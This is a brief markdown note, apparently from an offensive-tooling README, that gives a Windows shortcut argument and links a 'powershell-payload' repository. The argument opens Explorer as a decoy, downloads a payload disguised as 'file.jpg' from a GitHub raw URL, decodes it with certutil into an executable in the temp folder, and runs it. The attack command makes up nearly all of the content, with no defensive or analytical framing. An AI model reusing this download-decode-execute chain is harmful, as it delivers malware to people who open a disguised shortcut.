### Shortcut Argument
<code>C:\Windows\System32\cmd.exe /c powershell Start-Process explorer; Invoke-WebRequest https://raw.githubusercontent.com/halitAKAYDIN/payload/main/file.jpg -O file.jpg & certutil -decode file.jpg %temp%/file.exe & cmd.exe /c %temp%/file.exe</code>

### Examine payload type
https://github.com/halitAKAYDIN/powershell-payload
